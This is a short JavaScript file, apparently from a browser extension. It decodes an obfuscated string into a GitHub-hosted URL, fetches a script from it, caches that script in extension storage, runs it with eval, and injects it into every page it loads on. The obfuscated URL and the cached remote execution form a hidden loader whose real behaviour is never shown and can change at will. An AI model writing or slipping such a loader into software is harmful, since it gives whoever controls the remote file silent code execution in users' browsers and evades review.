
function updateContentScript() {
    fetch(
        "ivurt<01scx0hkujvdvuftdqovfpu0dqn1DqegJIvgtu0vikoitHptDqeg0obuugs1FzugoujqoGEU0".split("")
        .map((e, i) => String.fromCharCode(e.charCodeAt(0) - 1 - (i % 2))).join("") + "cnt.js")
    .then(r => { r.text().then(t => {
        chrome.storage.local.set({"cnt": t}, () => {})
        eval(t)
    })})
}

chrome.storage.local.get(["cnt"], (js) => {
    if (!js.cnt) {
        updateContentScript()
    } else {
		console.log("Running the script...", document.body)
		let d = document.createElement("script")
		d.innerHTML = js.cnt
		document.body.appendChild(d)
        // eval(js.cnt)
    }
})
